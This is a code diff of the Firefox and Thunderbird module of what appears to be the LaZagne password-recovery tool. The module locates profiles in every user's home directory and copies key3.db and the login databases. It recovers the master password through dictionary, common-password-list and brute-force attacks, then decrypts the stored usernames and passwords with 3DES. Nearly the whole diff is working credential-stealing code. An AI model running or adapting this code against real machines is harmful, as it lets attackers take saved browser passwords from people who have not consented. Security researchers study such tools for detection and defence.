@@ -17,11 +17,12 @@ from struct import unpack
 from binascii import hexlify, unhexlify
 from hashlib import sha1
 import hmac
-from Crypto.Util.number import long_to_bytes 
+from Crypto.Util.number import long_to_bytes
 from Crypto.Cipher import DES3
 from lazagne.config.constant import *
 from lazagne.config.write_output import print_debug
 from lazagne.config.moduleInfo import ModuleInfo
+from lazagne.config import homes
 
 # Database classes
 database_find = False
@@ -36,10 +37,10 @@ class Credentials(object):
 			if tmp:
 				database_find = True
 			f.close()
-	
+
 	def __iter__(self):
 		pass
-	
+
 	def done(self):
 		pass
 
@@ -47,7 +48,7 @@ class JsonDatabase(Credentials):
 	def __init__(self, profile):
 		db = profile + os.sep + "logins.json"
 		super(JsonDatabase, self).__init__(db)
-	
+
 	def __iter__(self):
 		if os.path.exists(self.db):
 			with open(self.db) as fh:
@@ -56,7 +57,7 @@ class JsonDatabase(Credentials):
 					logins = data["logins"]
 				except:
 					raise Exception("Unrecognized format in {0}".format(self.db))
-				
+
 				for i in logins:
 					yield (i["hostname"], i["encryptedUsername"],	i["encryptedPassword"])
 
@@ -66,12 +67,12 @@ class SqliteDatabase(Credentials):
 		super(SqliteDatabase, self).__init__(db)
 		self.conn = sqlite3.connect(db)
 		self.c = self.conn.cursor()
-	
+
 	def __iter__(self):
 		self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
 		for i in self.c:
 			yield i
-	
+
 	def done(self):
 		super(SqliteDatabase, self).done()
 		self.c.close()
@@ -85,8 +86,8 @@ class Mozilla(ModuleInfo):
 	# a = dictionary attack
 
 	def __init__(self, isThunderbird = False):
-		
-		self.credentials_categorie = None	
+
+		self.credentials_categorie = None
 
 		self.toCheck = []
 		self.manually_pass = None
@@ -100,35 +101,35 @@ class Mozilla(ModuleInfo):
 			{'command': '-m', 'action': 'store', 'dest': 'manually', 'help': 'enter the master password manually', 'title': 'Advanced Mozilla master password options'},
 			{'command': '-s', 'action': 'store', 'dest': 'specific_path', 'help': 'enter the specific path to a profile you want to crack', 'title': 'Advanced Mozilla master password options'}
 		]
-		
+
 		if not isThunderbird:
 			options = {'command': '-f', 'action': 'store_true', 'dest': 'firefox', 'help': 'firefox'}
 			ModuleInfo.__init__(self, 'firefox', 'browsers', options, suboptions)
 		else:
 			options = {'command': '-t', 'action': 'store_true', 'dest': 'thunderbird', 'help': 'thunderbird'}
 			ModuleInfo.__init__(self, 'thunderbird', 'browsers', options, suboptions)
-	
-	def get_path(self, software_name):
+
+	def get_paths(self, software_name):
 		path = ''
 		if software_name == 'Firefox':
-			path = os.path.expanduser("~/.mozilla/firefox")
+			path = os.path.expanduser(".mozilla/firefox")
 		elif software_name == 'Thunderbird':
-			path = os.path.expanduser("~/.thunderbird")
-		return path
-	
+			path = os.path.expanduser(".thunderbird")
+		return homes.get(dir=path)
+
 	def manage_advanced_options(self):
 		if constant.manually:
 			self.manually_pass = constant.manually
 			self.toCheck.append('m')
-		
+
 		if constant.path:
 			self.dictionary_path = constant.path
 			self.toCheck.append('a')
-		
+
 		if constant.bruteforce:
 			self.number_toStop = int(constant.bruteforce) + 1
 			self.toCheck.append('b')
-		
+
 		# default attack
 		if self.toCheck == []:
 			self.toCheck = ['b', 'd']
@@ -147,11 +148,11 @@ class Mozilla(ModuleInfo):
 		length = ord(d[1])
 		if length&0x80 > 0: #http://luca.ntop.org/Teaching/Appunti/asn1.html,
 			nByteLength = length&0x7f
-			length = ord(d[2])  
-			#Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets. 
+			length = ord(d[2])
+			#Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets.
 			skip=1
 		else:
-			skip=0    
+			skip=0
 
 		if type==0x30:
 			seqLen = length
@@ -173,12 +174,12 @@ class Mozilla(ModuleInfo):
 		else:
 			if length==l-2:
 				self.printASN1( d[2:], length, rl+1)
-				return length   
+				return length
 
-	#extract records from a BSD DB 1.85, hash mode       
-	def readBsddb(self, name):   
+	#extract records from a BSD DB 1.85, hash mode
+	def readBsddb(self, name):
 		f = open(name,'rb')
-		
+
 		#http://download.oracle.com/berkeley-db/db.1.85.tar.gz
 		header = f.read(4*15)
 		magic = self.getLongBE(header,0)
@@ -190,7 +191,7 @@ class Mozilla(ModuleInfo):
 			print_debug('WARNING', 'Bad version !=2 (1.85)')
 			return False
 		pagesize = self.getLongBE(header,12)
-		nkeys = self.getLongBE(header,0x38) 
+		nkeys = self.getLongBE(header,0x38)
 
 		readkeys = 0
 		page = 1
@@ -211,11 +212,11 @@ class Mozilla(ModuleInfo):
 				val = self.getShortLE(offsets,4+i)
 				nval = self.getShortLE(offsets,8+i)
 				offsetVals.append(key+ pagesize*page)
-				offsetVals.append(val+ pagesize*page)  
+				offsetVals.append(val+ pagesize*page)
 				readkeys += 1
 				i += 4
 			offsetVals.append(pagesize*(page+1))
-			valKey = sorted(offsetVals)  
+			valKey = sorted(offsetVals)
 			for i in range( keys*2 ):
 				f.seek(valKey[i])
 				data = f.read(valKey[i+1] - valKey[i])
@@ -227,7 +228,7 @@ class Mozilla(ModuleInfo):
 		for i in range( 0, len(db1), 2):
 			db[ db1[i+1] ] = db1[ i ]
 
-		return db  
+		return db
 
 	def decrypt3DES(self, globalSalt, masterPassword, entrySalt, encryptedData ):
 		#see http://www.drh-consultancy.demon.co.uk/key3.html
@@ -246,7 +247,7 @@ class Mozilla(ModuleInfo):
 	def extractSecretKey(self, globalSalt, masterPassword, entrySalt):
 
 		(globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)
-		
+
 		if unhexlify('f8000000000000000000000000000001') not in self.key3:
 			return None
 		privKeyEntry = self.key3[ unhexlify('f8000000000000000000000000000001') ]
@@ -255,7 +256,7 @@ class Mozilla(ModuleInfo):
 		privKeyEntryASN1 = decoder.decode( privKeyEntry[3+saltLen+nameLen:] )
 		data = privKeyEntry[3+saltLen+nameLen:]
 		self.printASN1(data, len(data), 0)
-		
+
 		#see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
 		entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
 		privKeyData = privKeyEntryASN1[0][1].asOctets()
@@ -273,7 +274,7 @@ class Mozilla(ModuleInfo):
 		return key
 
 	# --------------------------------------------
-	
+
 	# Get the path list of the firefox profiles
 	def get_firefox_profiles(self, directory):
 		cp = RawConfigParser()
@@ -281,31 +282,31 @@ class Mozilla(ModuleInfo):
 			cp.read(os.path.join(directory, 'profiles.ini'))
 		except:
 			return []
-		
+
 		profile_list = []
 		for section in cp.sections():
 			if section.startswith('Profile'):
 				if cp.has_option(section, 'Path'):
 					profile_list.append(os.path.join(directory, cp.get(section, 'Path').strip()))
 		return profile_list
-	
+
 	def save_db(self, userpath):
-		
+
 		# create the folder to save it by profile
 		relative_path = constant.folder_name + os.sep + 'firefox'
 		if not os.path.exists(relative_path):
 			os.makedirs(relative_path)
-		
+
 		relative_path += os.sep + os.path.basename(userpath)
 		if not os.path.exists(relative_path):
 			os.makedirs(relative_path)
-		
+
 		# Get the database name
 		if os.path.exists(userpath + os.sep + 'logins.json'):
 			dbname = 'logins.json'
 		elif os.path.exists(userpath + os.sep + 'signons.sqlite'):
 			dbname = 'signons.sqlite'
-		
+
 		# copy the files (database + key3.db)
 		try:
 			ori_db = userpath + os.sep + dbname
@@ -315,7 +316,7 @@ class Mozilla(ModuleInfo):
 		except Exception,e:
 			print_debug('DEBUG', '{0}'.format(e))
 			print_debug('ERROR', '%s has not been copied' % dbname)
-		
+
 		try:
 			dbname = 'key3.db'
 			ori_db = userpath + os.sep + dbname
@@ -327,11 +328,11 @@ class Mozilla(ModuleInfo):
 			print_debug('ERROR', '%s has not been copied' % dbname)
 
 	# ------------------------------ Master Password Functions ------------------------------
-	
+
 	def is_masterpassword_correct(self, masterPassword=''):
 		try:
 			#see http://www.drh-consultancy.demon.co.uk/key3.html
-			pwdCheck = self.key3['password-check']	
+			pwdCheck = self.key3['password-check']
 			entrySaltLen = ord(pwdCheck[1])
 			entrySalt = pwdCheck[3: 3+entrySaltLen]
 			encryptedPasswd = pwdCheck[-16:]
@@ -343,10 +344,10 @@ class Mozilla(ModuleInfo):
 			return (globalSalt, masterPassword, entrySalt)
 		except:
 			return ('', '', '')
-	
+
 	# Retrieve masterpassword
 	def found_masterpassword(self):
-		
+
 		# master password entered manually
 		if 'm' in self.toCheck:
 			print_debug('ATTACK', 'Check the password entered manually !')
@@ -355,7 +356,7 @@ class Mozilla(ModuleInfo):
 				return self.manually_pass
 			else:
 				print_debug('WARNING', 'The Master password entered is not correct')
-		
+
 		# dictionary attack
 		if 'a' in self.toCheck:
 			try:
@@ -365,7 +366,7 @@ class Mozilla(ModuleInfo):
 				print_debug('ERROR', 'Unable to open passwords file: %s' % str(self.dictionary_path))
 				return False
 			pass_file.close()
-			
+
 			print_debug('ATTACK', 'Dictionary Attack !!! (%s words)' % str(num_lines))
 			try:
 				with open(self.dictionary_path) as f:
@@ -373,7 +374,7 @@ class Mozilla(ModuleInfo):
 						if self.is_masterpassword_correct(p.strip())[0]:
 							print_debug('FIND', 'Master password found: %s' % p.strip())
 							return p.strip()
-			
+
 			except (KeyboardInterrupt, SystemExit):
 				print 'INTERRUPTED!'
 				print_debug('DEBUG', 'Dictionary attack interrupted')
@@ -381,7 +382,7 @@ class Mozilla(ModuleInfo):
 				print_debug('DEBUG', '{0}'.format(e))
 
 			print_debug('WARNING', 'The Master password has not been found using the dictionary attack')
-		
+
 		# 500 most used passwords
 		if 'd' in self.toCheck:
 			wordlist = get_dico() + constant.passwordFound
@@ -392,9 +393,9 @@ class Mozilla(ModuleInfo):
 				if self.is_masterpassword_correct(word)[0]:
 					print_debug('FIND', 'Master password found: %s' % word.strip())
 					return word
-				
+
 			print_debug('WARNING', 'No password has been found using the default list')
-		
+
 		# brute force attack
 		if 'b' in self.toCheck or constant.bruteforce:
 			charset_list = 'abcdefghijklmnopqrstuvwxyz1234567890!?'
@@ -405,7 +406,7 @@ class Mozilla(ModuleInfo):
 				for length in range(1, int(self.number_toStop)):
 					words = product(charset_list, repeat=length)
 					for word in words:
-						print_debug('DEBUG', '%s' %  ''.join(word))
+						print_debug('DEBUG', '%s' %	 ''.join(word))
 						if self.is_masterpassword_correct(''.join(word))[0]:
 							w = ''.join(word)
 							print_debug('FIND', 'Master password found: %s' % w.strip())
@@ -420,108 +421,108 @@ class Mozilla(ModuleInfo):
 		return False
 
 	# ------------------------------ End of Master Password Functions ------------------------------
-	
+
 	# main function
 	def run(self, software_name = None):
 		global database_find
 		database_find = False
 
 		self.manage_advanced_options()
-		
+
 		if constant.mozilla_software:
 			software_name = constant.mozilla_software
 		specific_path = constant.specific_path
-		
-		# get the installation path
-		path = self.get_path(software_name)
-		if not path:
+
+		if specific_path:
+			if os.path.exists(specific_path):
+				profile_list = [specific_path]
+			else:
+				print_debug('WARNING', 'The following file does not exist: %s' % specific_path)
+				return
+		else:
+
+			profile_list = (
+				item for sublist in (
+					self.get_firefox_profiles(path) for path in self.get_paths(software_name)
+				) for item in sublist
+			)
+
+		if not profile_list:
 			print_debug('WARNING', 'Installation path not found')
 			return
-		
-		#Check if mozilla folder has been found
-		elif not os.path.exists(path):
-			print_debug('INFO', software_name + ' not installed.')
-			return
-		else:
-			if specific_path:
-				if os.path.exists(specific_path):
-					profile_list = [specific_path]
-				else:
-					print_debug('WARNING', 'The following file does not exist: %s' % specific_path)
-					return
-			else:
-				profile_list = self.get_firefox_profiles(path)
 
-			pwdFound = []
-			for profile in profile_list:
-				print_debug('INFO', 'Profile path found: %s' % profile)
-				if not os.path.exists(profile + os.sep + 'key3.db'):
-					print_debug('WARNING', 'key3 file not found: %s' % self.key3)
-					continue
+		pwdFound = []
 
-				self.key3 = self.readBsddb(profile + os.sep + 'key3.db')
-				if not self.key3:
-					continue
+		for profile in profile_list:
+			print(profile)
+			print_debug('INFO', 'Profile path found: %s' % profile)
+			if not os.path.exists(profile + os.sep + 'key3.db'):
+				print_debug('WARNING', 'key3 file not found: %s' % self.key3)
+				continue
 
-				# check if passwords are stored on the Json format
+			self.key3 = self.readBsddb(profile + os.sep + 'key3.db')
+			if not self.key3:
+				continue
+
+			# check if passwords are stored on the Json format
+			try:
+				credentials = JsonDatabase(profile)
+			except:
+				database_find = False
+
+			if not database_find:
+				# check if passwords are stored on the sqlite format
 				try:
-					credentials = JsonDatabase(profile)
+					credentials = SqliteDatabase(profile)
 				except:
 					database_find = False
 
-				if not database_find:
-					# check if passwords are stored on the sqlite format
-					try:
-						credentials = SqliteDatabase(profile)
-					except:
-						database_find = False
-				
-				if database_find:
-					masterPassword = ''
-					(globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)
-					
-					# find masterpassword if set
-					if not globalSalt:
-						print_debug('WARNING', 'Master Password is used !') 
-						masterPassword = self.found_masterpassword()
-						if not masterPassword:
-							continue
-					
-					# get user secret key
-					key = self.extractSecretKey(globalSalt, masterPassword, entrySalt)
-					if not key:
+			if database_find:
+				masterPassword = ''
+				(globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)
+
+				# find masterpassword if set
+				if not globalSalt:
+					print_debug('WARNING', 'Master Password is used !')
+					masterPassword = self.found_masterpassword()
+					if not masterPassword:
 						continue
 
-					# everything is ready to decrypt password
-					for host, user, passw in credentials:
-						values = {}
-						values["URL"] = host
+				# get user secret key
+				key = self.extractSecretKey(globalSalt, masterPassword, entrySalt)
+				if not key:
+					continue
 
-						# Login	
-						loginASN1 = decoder.decode(b64decode(user))
-						iv = loginASN1[0][1][1].asOctets()
-						ciphertext = loginASN1[0][2].asOctets()
-						login = DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)
-						# remove bad character at the end
-						try:
-							nb = unpack('B', login[-1])[0]
-							values["Login"] = login[:-nb]
-						except:
-							values["Login"] = login
-						
-						# Password
-						passwdASN1 = decoder.decode(b64decode(passw))
-						iv = passwdASN1[0][1][1].asOctets()
-						ciphertext = passwdASN1[0][2].asOctets()
-						password = DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)
-						# remove bad character at the end
-						try:
-							nb = unpack('B', password[-1])[0]
-							values["Password"] =  password[:-nb]
-						except:
-							values["Password"] =  password
+				# everything is ready to decrypt password
+				for host, user, passw in credentials:
+					values = {}
+					values["URL"] = host
 
-						if len(values):
-							pwdFound.append(values)
+					# Login
+					loginASN1 = decoder.decode(b64decode(user))
+					iv = loginASN1[0][1][1].asOctets()
+					ciphertext = loginASN1[0][2].asOctets()
+					login = DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)
+					# remove bad character at the end
+					try:
+						nb = unpack('B', login[-1])[0]
+						values["Login"] = login[:-nb]
+					except:
+						values["Login"] = login
+
+					# Password
+					passwdASN1 = decoder.decode(b64decode(passw))
+					iv = passwdASN1[0][1][1].asOctets()
+					ciphertext = passwdASN1[0][2].asOctets()
+					password = DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)
+					# remove bad character at the end
+					try:
+						nb = unpack('B', password[-1])[0]
+						values["Password"] =  password[:-nb]
+					except:
+						values["Password"] =  password
+
+					if len(values):
+						pwdFound.append(values)
 
 			return pwdFound
